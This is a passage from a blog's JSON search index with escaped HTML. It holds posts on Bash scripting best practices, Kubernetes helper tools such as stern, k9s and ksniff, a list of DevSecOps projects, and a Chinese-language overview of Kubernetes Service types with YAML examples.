tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e# Bash3 Boilerplate. Copyright (c) 2014, kvz.io\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o errexit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o pipefail\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o nounset\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# set -o xtrace\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set magic variables for current file \u0026amp; dir\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e__dir\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecd \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edirname \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eBASH_SOURCE[0]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e pwd\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e__file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e__dir\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eBASH_SOURCE[0]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e__base\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e__file\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e .sh\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e__root\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecd \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edirname \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e__dir\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e pwd\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# \u0026lt;-- change this as it depends on your app\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003earg1\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#66d9ef\"\u003e:-\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"use-shift-to-read-function-arguments\"\u003eUse shift to read function arguments\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis makes it easier to reorder arguments, if you change your mind later.\u003c/p\u003e","tags":["URL","SHELL","BASH"],"title":"Best Practices for Writing Bash Scripts"},{"categories":["URL","Kubernetes","Plugin"],"contents":" Day 28 - Kubernetes 第三方好用工具介紹 $ kubectl get pods NAME READY STATUS RESTARTS AGE ithome-6564f65698-947rv 1/1 Running 0 84s ithome-6564f65698-fglr9 1/1 Running 0 84s ithome-6564f65698-k5wtg 1/1 Running 0 84s ithome-6564f65698-rrvk4 1/1 Running 0 84s ithome-6564f65698-zhwlj 1/1 Running 0 84s Stern/Kail 創建出來的 Pod 名稱上面都會有一些不好閱讀的亂數\n如果使用 kubectl 來觀察個別 Pod 的 log 就必須要於不同的 pod 之間來回切換\n這方面的工具滿多的，譬如 Stern, Kube-tail, Kail 等都可以\n上述範例會有五個 pod，而且這五個 pod 的名稱都是 ithome 開頭，因此我可以直接用 stern ithom 的方式來抓取這些 pod 的資訊，結果如下圖\n$ stern ithome ... ithome-6564f65698-zhwlj netutils Hello! 369 secs elapsed... ithome-6564f65698-fglr9 netutils Hello! 369 secs elapsed... ithome-6564f65698-947rv netutils Hello! 367 secs elapsed... ithome-6564f65698-k5wtg netutils Hello! 368 secs elapsed... ithome-6564f65698-rrvk4 netutils Hello! 369 secs elapsed... ithome-6564f65698-zhwlj netutils Hello! 370 secs elapsed... ithome-6564f65698-fglr9 netutils Hello! 370 secs elapsed... ithome-6564f65698-947rv netutils Hello! 368 secs elapsed... ithome-6564f65698-k5wtg netutils Hello! 370 secs elapsed... ithome-6564f65698-rrvk4 netutils Hello! 370 secs elapsed... ithome-6564f65698-zhwlj netutils Hello! 371 secs elapsed... ithome-6564f65698-fglr9 netutils Hello! 371 secs elapsed... ithome-6564f65698-947rv netutils Hello! 369 secs elapsed... ithome-6564f65698-k5wtg netutils Hello! 371 secs elapsed... ithome-6564f65698-rrvk4 netutils Hello! 371 secs elapsed... ithome-6564f65698-zhwlj netutils Hello! 372 secs elapsed... ithome-6564f65698-fglr9 netutils Hello! 372 secs elapsed... ^C K9S 過往總是透過 kubectl 指令於各個資源，各 namespace 間切來切去，特別是要使用 exec, get, describe, logs, delete 等指令時，常常打的手忙腳亂或是覺得心累，有這種困擾的人可以考慮使用看看 k9s 這個工具\nKsniff 抓取網路封包的工具\n$ sudo apt install tshark $ kubectl sniff ithome-6564f65698-947rv -o - | tshark -r - $ kubectl sniff ithome-6564f65698-947rv -o - | tshark -r - INFO[0000] sniffing method: upload static tcpdump INFO[0000] using tcpdump path at: \u0026#39;/home/ubuntu/.krew/store/sniff/v1.4.2/static-tcpdump\u0026#39; INFO[0000] no container specified, taking first container we found in pod. INFO[0000] selected container: \u0026#39;netutils\u0026#39; INFO[0000] sniffing on pod: \u0026#39;ithome-6564f65698-947rv\u0026#39; [namespace: \u0026#39;default\u0026#39;, container: \u0026#39;netutils\u0026#39;, filter: \u0026#39;\u0026#39;, interface: \u0026#39;any\u0026#39;] INFO[0000] uploading static tcpdump binary from: \u0026#39;/home/ubuntu/.krew/store/sniff/v1.4.2/static-tcpdump\u0026#39; to: \u0026#39;/tmp/static-tcpdump\u0026#39; INFO[0000] uploading file: \u0026#39;/home/ubuntu/.krew/store/sniff/v1.4.2/static-tcpdump\u0026#39; to \u0026#39;/tmp/static-tcpdump\u0026#39; on container: \u0026#39;netutils\u0026#39; INFO[0000] executing command: \u0026#39;[/bin/sh -c ls -alt /tmp/static-tcpdump]\u0026#39; on container: \u0026#39;netutils\u0026#39;, pod: \u0026#39;ithome-6564f65698-947rv\u0026#39;, namespace: \u0026#39;default\u0026#39; INFO[0000] command: \u0026#39;[/bin/sh -c ls -alt /tmp/static-tcpdump]\u0026#39; executing successfully exitCode: \u0026#39;0\u0026#39;, stdErr :\u0026#39;\u0026#39; INFO[0000] file found: \u0026#39;-rwxr-xr-x 1 root root 2696368 Jan 1 1970 /tmp/static-tcpdump \u0026#39; INFO[0000] file was already found on remote pod INFO[0000] tcpdump uploaded successfully INFO[0000] output file option specified, storing output in: \u0026#39;-\u0026#39; INFO[0000] start sniffing on remote container INFO[0000] executing command: \u0026#39;[/tmp/static-tcpdump -i any -U -w - ]\u0026#39; on container: \u0026#39;netutils\u0026#39;, pod: \u0026#39;ithome-6564f65698-947rv\u0026#39;, namespace: \u0026#39;default\u0026#39; ","date":"December 2, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211202-10252675/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10252675\" target=\"_blank\" rel=\"noopener\"\u003eDay 28 - Kubernetes 第三方好用工具介紹\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ kubectl get pods\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNAME                      READY   STATUS    RESTARTS   AGE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-947rv   1/1     Running   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e          84s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-fglr9   1/1     Running   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e          84s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-k5wtg   1/1     Running   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e          84s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-rrvk4   1/1     Running   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e          84s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-zhwlj   1/1     Running   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e          84s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"sternkail\"\u003e\u003ca href=\"https://github.com/wercker/stern\" target=\"_blank\" rel=\"noopener\"\u003eStern\u003c/a\u003e/Kail\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e創建出來的 Pod 名稱上面都會有一些不好閱讀的亂數\u003c/p\u003e\n\u003cp\u003e如果使用 kubectl 來觀察個別 Pod 的 log 就必須要於不同的 pod 之間來回切換\u003c/p\u003e\n\u003cp\u003e這方面的工具滿多的，譬如 Stern, Kube-tail, Kail 等都可以\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e上述範例會有五個 pod，而且這五個 pod 的名稱都是 ithome 開頭，因此我可以直接用 \u003ccode\u003estern ithom\u003c/code\u003e 的方式來抓取這些 pod 的資訊，結果如下圖\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ stern ithome\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-zhwlj netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e369\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-fglr9 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e369\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-947rv netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e367\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-k5wtg netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e368\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-rrvk4 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e369\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-zhwlj netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e370\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-fglr9 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e370\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-947rv netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e368\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-k5wtg netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e370\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-rrvk4 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e370\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-zhwlj netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e371\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-fglr9 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e371\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-947rv netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e369\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-k5wtg netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e371\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-rrvk4 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e371\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-zhwlj netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e372\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eithome-6564f65698-fglr9 netutils Hello! \u003cspan style=\"color:#ae81ff\"\u003e372\u003c/span\u003e secs elapsed...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e^C\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"k9s\"\u003eK9S\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e過往總是透過 kubectl 指令於各個資源，各 namespace 間切來切去，特別是要使用 \u003ccode\u003eexec\u003c/code\u003e, \u003ccode\u003eget\u003c/code\u003e, \u003ccode\u003edescribe\u003c/code\u003e, \u003ccode\u003elogs\u003c/code\u003e, \u003ccode\u003edelete\u003c/code\u003e 等指令時，常常打的手忙腳亂或是覺得心累，有這種困擾的人可以考慮使用看看 k9s 這個工具\u003c/p\u003e","tags":["URL","Kubernetes","Plugin"],"title":"Day 28 - Kubernetes 第三方好用工具介紹"},{"categories":["URL","DevSecOps","cloud-native"],"contents":" 5 DevSecOps open source projects to know Clair Sigstore KubeLinter Open Policy Agent and Gatekeeper Falco ","date":"November 30, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211130-5-devsecops-open-source-projects-know/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://enterprisersproject.com/article/2021/8/5-devsecops-open-source-projects-know\" target=\"_blank\" rel=\"noopener\"\u003e5 DevSecOps open source projects to know\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"clair\"\u003e\u003ca href=\"https://github.com/quay/clair\" target=\"_blank\" rel=\"noopener\"\u003eClair\u003c/a\u003e\u003c/h4\u003e\n\u003ch4 id=\"sigstore\"\u003e\u003ca href=\"https://www.sigstore.dev/\" target=\"_blank\" rel=\"noopener\"\u003eSigstore\u003c/a\u003e\u003c/h4\u003e\n\u003ch4 id=\"kubelinter\"\u003e\u003ca href=\"https://github.com/stackrox/kube-linter\" target=\"_blank\" rel=\"noopener\"\u003eKubeLinter\u003c/a\u003e\u003c/h4\u003e\n\u003ch4 id=\"open-policy-agent-and-gatekeeper\"\u003e\u003ca href=\"https://github.com/open-policy-agent/gatekeeper\" target=\"_blank\" rel=\"noopener\"\u003eOpen Policy Agent and Gatekeeper\u003c/a\u003e\u003c/h4\u003e\n\u003ch4 id=\"falco\"\u003e\u003ca href=\"https://falco.org/\" target=\"_blank\" rel=\"noopener\"\u003eFalco\u003c/a\u003e\u003c/h4\u003e","tags":["URL","DevSecOps","cloud-native"],"title":"5 DevSecOps open source projects to know"},{"categories":["URL","Kubernetes"],"contents":" [Kubernetes] Service Overview 定義 Service 搭配 selector 由於要先有 Pod 才會有定義 Service 的需求，因此假設 k8s 中已經有一些 Pod 的存在(同時對外開放 TCP port 9376)，並帶有 app=MyApp 的 label，此時就可以定義一個 Service 來作為這些 pod 前方的抽象層，透過 domain name 的方式提供服務\nkind: Service apiVersion: v1 metadata: name: my-service spec: # type 一共有四種(ClusterIP, NodePort, LoadBalancer, ExternalName) # 預設是 ClusterIP type: ClusterIP # 選擇帶有 \u0026#34;app=MyApp\u0026#34; 的 pod selector: app: MyApp # Service 實際對外服務的設定 ports: - protocol: TCP port: 80 # 此為 Pod 對外開放的 port number targetPort: 9376 Pod \u0026lt;---\u0026gt; Endpoint(tcp:9376) \u0026lt;---\u0026gt; Service(tcp:80, with VIP)\n若是 targetPort 不設定，預設會與 spec.ports.port 相同 若 protocol 不設定，預設使用 TCP 從 v1.12 開始支援 SCTP(適合用於電信產業 or 提供串流服務時使用)，但預設關閉，需要透過 SCTPSupport feature gate 開啟 不與 selector 搭配 一般 Service 是作為 存取 pod 用的抽象層，但其實作為其他 backend 的抽象層，而這一類的需求可能來自於下列的情況：\n在生產環境中有個 external database，但在測試環境中是使用 internal database\n想要將 Service 指到位於其他 namespace or cluster 中的 service\n想要將某些 workload 移到 k8s 上面跑，但有些 backend service 依然還在 k8s 之外\nkind: Service apiVersion: v1 metadata: name: my-service spec: ports: - protocol: TCP port: 80 targetPort: 9376 由於沒有設定 label selector，因此也就不會產生相對應的 endpoint，此時我們就需要自己建立一個 Endpoint resource object，並指到真正的 backend service\nkind: Endpoints apiVersion: v1 metadata: name: my-service subsets: - addresses: - ip: 1.2.3.4 ports: - port: 9376 透過以上兩組設定，就可以將到達 my-service 的網路流量導向 1.2.3.4:9376 去。\n另外，在設定 Endpoint 時有幾點需要注意：\n不能使用 loopback (127.0.0.0/8), link-local (169.254.0.0/16), or link-local multicast (224.0.0.0/24) … 等幾段 IP 也不能使用設定在 k8s 中的 cluster ip 網段 以上的範例的 service type 皆為 ClusterIP；另外還有一種稱為 ExternalName，同樣也是沒有 selector 但以 DNS name 為基礎來進行設定\nService Types 上面所介紹的部份，其實都是屬於 ClusterIP type 的 service，但其實 service type 一共有四種，分別是：\nClusterIP：提供 cluster 內部存取 NodePort：供外部存取 LoadBalancer：供外部存取 (但只限於支援此 type 的 public cloud) ExternalName：單純回應給 client 外部的 DNS CName record (並非由 k8s cluster 內部的 pod 服務) ClusterIP 只是必須注意的是，將 type 設定為 ClusterIP 的 service，只能在 k8s cluster 內部存取；若是要提供給外部存取，則是要使用下面介紹的 NodePort \u0026amp; LoadBalancer 兩種 service type\nNodePort 在私有內部的環境中，要讓 k8s cluster 外部存取佈署好的 pod，透過 NodePort type service 是其中一個方式，以下是一個設定 NodePort type service 的簡單範例\nkind: Service apiVersion: v1 metadata: name: my-nodeport-service spec: # 將 type 設定為 NodePort type: NodePort # 選擇帶有 \u0026#34;app=MyApp\u0026#34; 的 pod selector: app: MyApp # Service 實際對外服務的設定 ports: - protocol: TCP port: 80 targetPort: 9376 # 指定 NodePort number(.spec.ports[*].nodePort) # 也可不指定(30000~32767) nodePort: 30036 $ kubectl get all NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE .... (略) service/my-nodeport-service NodePort 10.233.44.13 \u0026lt;none\u0026gt; 80:30036/TCP 7s kube-proxy 還會在每個 node 上放上相對應的 iptables rule\n# 不僅放上規則，還會附帶清楚的註解 $ iptables-save | grep my-nodeport-service -A KUBE-EXTERNAL-SERVICES -p tcp -m comment --comment \u0026#34;default/my-nodeport-service: has no endpoints\u0026#34; -m addrtype --dst-type LOCAL -m tcp --dport 30036 -j REJECT --reject-with icmp-port-unreachable -A KUBE-SERVICES -d 10.233.44.13/32 -p tcp -m comment --comment \u0026#34;default/my-nodeport-service: has no endpoints\u0026#34; -m tcp --dport 80 -j REJECT --reject-with icmp-port-unreachable 最後，NodePort service 在使用上有以下幾個重點需要注意：\nNodePort 所分配到的 port number 是從 API server 啟動參數中的 --service-node-port-range 來的，預設是 30000 ~ 32767 若要自訂 NodePort number，則是在 Service 中定義 .spec.ports[*].nodePort (只能使用在上面定義的範圍內的 port number) NodePort 預設的有效範圍是 node 的所有 interface 若希望只由特定的 IP 來處理 NodePort 的流量，可透過 API server 啟動參數中的 --nodeport-addresses 來指定(例如：使用 --nodeport-addresses=127.0.0.0/8 表示所有 NodePort 流量都會有 loopback interface 來處理) 設定 NodePort 後，可以透過兩種方式存取 Service，分別是 \u0026lt;NodeIP\u0026gt;:spec.ports[*].nodePort \u0026amp; .spec.clusterIP:spec.ports[*].port Load Balancer Load Balancer type 是另一個讓外部可以直接存取 cluster 內部 service 的方式。\n但這個 Service Type 需要與外部的 load balancer 服務搭配，因此目前僅有在 public cloud or OpenStack 上才有支援\nExternalName ExternalName 的設定其實就是把 Service 導向指定的 DNS name，而不是 service 中 label selector 所設定的 pod\nkind: Service apiVersion: v1 metadata: name: my-service namespace: prod spec: type: ExternalName externalName: my.database.example.com 當 cluster 內部查找 my-service.prod.svc 的時候，k8s DNS service 就只會回應 my.database.example.com 這個 CNAME recrd。\n但回應 CNAME record 跟其他 type 有何差別? 其實就是當存取 ExternalName type 的 service 時，網路流量的導向是發生在 DNS level 而不是透過 proxying or forwarding 達成的。\n注意! 若要使用 ExternalName，k8s DNS service 的部份僅能安裝 kube-dns，且版本需要是 1.7 以上\nExternal IP 這不算是一個 service type，但可以讓使用者指定 service 要黏在哪個 IP 上\nkind: Service apiVersion: v1 metadata: name: my-service spec: selector: app: MyApp ports: - name: http protocol: TCP port: 80 targetPort: 9376 # 此 service 只會將進入 80.11.12.10:80 的 網路流量 # 導向後端的 endpoints externalIPs: - 80.11.12.10 透過以上設定，service 只會將進入 80.11.12.10:80 的 網路流量導向使用 Label Selector 選出來的 endpoint(Pod) 中。\n而需要注意的是，External IP 的部份並不屬於 k8s 個管理範圍內，使用者若要使用就必須自己負責管理好這個部份。\n","date":"November 24, 2021","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211124-k8s-service-overview/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://godleon.github.io/blog/Kubernetes/k8s-Service-Overview/\" target=\"_blank\" rel=\"noopener\"\u003e[Kubernetes] Service Overview\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"定義-service\"\u003e定義 Service\u003c/h3\u003e\n\u003ch4 id=\"搭配-selector\"\u003e搭配 selector\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e由於要先有 Pod 才會有定義 Service 的需求，因此假設 k8s 中已經有一些 Pod 的存在(同時對外開放 TCP port 9376)，並帶有 app=MyApp 的 label，此時就可以定義一個 Service 來作為這些 pod 前方的抽象層，透過 domain name 的方式提供服務\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ekind\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eService\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eapiVersion\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ev1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003emetadata\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003emy-service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003espec\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# type 一共有四種(ClusterIP, NodePort, LoadBalancer, ExternalName)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# 預設是 ClusterIP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etype\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eClusterIP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# 選擇帶有 